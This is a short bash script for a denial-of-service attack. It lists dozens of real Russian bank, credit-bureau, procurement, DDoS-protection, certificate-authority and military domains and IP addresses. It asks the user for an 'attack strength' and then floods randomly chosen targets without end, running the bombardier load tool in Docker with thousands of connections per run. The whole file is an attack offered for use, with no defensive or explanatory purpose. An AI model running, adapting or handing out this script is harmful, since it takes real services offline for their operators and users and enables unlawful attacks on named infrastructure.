#!/usr/bin/env bash

DESTS=(
"www.tinkoff.ru"
"178.248.236.218"
"92.223.84.84"
"91.194.226.50"
"78.46.94.184"
"46.4.106.111"
"91.194.226.32"
"91.194.226.22"
"91.194.226.15"
"91.194.226.6"
"https://www.equifax.ru/"
"37.16.85.110"
"37.16.85.113"
"178.216.96.114"
"176.74.12.38"
"37.16.85.182"
"https://www.banki.ru/"
"185.71.67.241"
"185.10.61.125"
"92.223.124.254"
"212.24.61.92"
"185.10.61.116"
"176.112.198.163"
"https://bki-okb.ru/"
"141.101.233.39"
"185.215.4.14"
"185.215.4.10"
"178.248.232.250"
"185.9.230.77"
"https://www.nbki.ru/"
"91.201.54.26"
"195.10.198.35"
"195.10.198.37"
"195.10.198.201"
"195.10.198.242"
"195.10.198.136"
"195.10.198.243"
"195.10.198.204"
"195.10.198.130"
"195.10.198.208"
"195.10.198.203"
"https://etpgpb.ru"
"https://api.etpgpb.ru"
"https://etp.gpb.ru"
"https://passport.etpgpb.ru"
"https://gos.etpgpb.ru"
"https://inter-rao.etpgpb.ru"
"https://rosnedra.etpgpb.ru"
"https://gpn.etpgpb.ru"
"https://geh.etpgpb.ru"
"https://trade.etpgpb.ru"
"https://gb.etpgpb.ru"
"https://koronapay.com"
"https://api.koronapay.com"
"https://ddos-guard.net/ru"
"https://stormwall.pro/"
"https://qrator.net/ru/"
"https://solidwall.ru/"
"https://iecp.ru/ep/ep-verification"
"https://iecp.ru/ep/uc-list"
"https://uc-osnovanie.ru/"
"https://kk.bank/UdTs"
"http://structure.mil.ru/structure/uc/info.htm"
"http://www.e-portal.ru"
"http://izhtender.ru"
)

TIME="360s"
ARR_LENGTH=${#DESTS[@]}

read -p 'Enter the strength of attack. 1 - 20+, depending on you internet speed:' CONNECTIONS

while :
do
    RANDOMNUM=$((RANDOM % ARR_LENGTH ))
    DEST=${DESTS[$RANDOMNUM]}

    FULLCONNECTIONS=$((CONNECTIONS * 1000))
    docker run -ti --rm alpine/bombardier -c $FULLCONNECTIONS -d $TIME -l $DEST
done
